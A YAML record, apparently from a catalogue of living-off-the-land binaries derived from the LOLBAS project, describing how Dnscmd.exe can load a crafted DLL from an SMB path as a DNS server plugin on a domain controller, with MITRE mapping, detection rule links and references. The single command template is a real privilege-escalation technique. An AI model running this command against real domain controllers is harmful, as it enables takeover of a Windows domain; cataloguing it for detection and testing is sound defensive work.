@@ -1,0 +1,97 @@
+id: lolbas/T1NCaW5hcmllcy9EbnNjbWQueW1s/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: Dnscmd.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: specific-right
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1543.003
+opsec:
+  noise: high
+  triggers: Dnscmd.exe loading dll from UNC/arbitrary path
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
+commands:
+- template: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
+  comment: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a
+    DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Dnscmd.exe
+      category: Execute
+      privileges: DNS admin
+      mitre_id: T1543.003
+      source_file: OSBinaries/Dnscmd.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Dnscmd.exe\nDescription: A command-line interface for managing DNS servers\n\
+        Author: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: dnscmd.exe dc1.lab.int /config\
+        \ /serverlevelplugindll {PATH_SMB:.dll}\n    Description: Adds a specially crafted DLL as a plug-in\
+        \ of the DNS Service. This command must be run on a DC by a user that is at least a member of\
+        \ the DnsAdmins group. See the reference links for DLL details.\n    Usecase: Remotely inject\
+        \ dll to dns server\n    Category: Execute\n    Privileges: DNS admin\n    MitreID: T1543.003\n\
+        \    OperatingSystem: Windows server\n    Tags:\n      - Execute: DLL\n      - Execute: Remote\n\
+        Full_Path:\n  - Path: C:\\Windows\\System32\\Dnscmd.exe\n  - Path: C:\\Windows\\SysWOW64\\Dnscmd.exe\n\
+        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml\n\
+        \  - IOC: Dnscmd.exe loading dll from UNC/arbitrary path\nResources:\n  - Link: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n\
+        \  - Link: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html\n  - Link: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp\n\
+        \  - Link: https://twitter.com/Hexacorn/status/994000792628719618\n  - Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html\n\
+        Acknowledgement:\n  - Person: Shay Ber\n  - Person: Dimitrios Slamaris\n    Handle: '@dim0x69'\n\
+        \  - Person: Nikhil SamratAshok\n    Handle: '@nikhil_mitt'\n"
+      document_sha256: sha256:bed6776b9ebcde4fae7d0f06496b21602c5093a7eb3a617b42976c5d75157263
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1543.003
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: specific-right
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:e3128dd7922f23170b01a8325bd7cdedd777bda39d52883507b0c78c3f76ef72
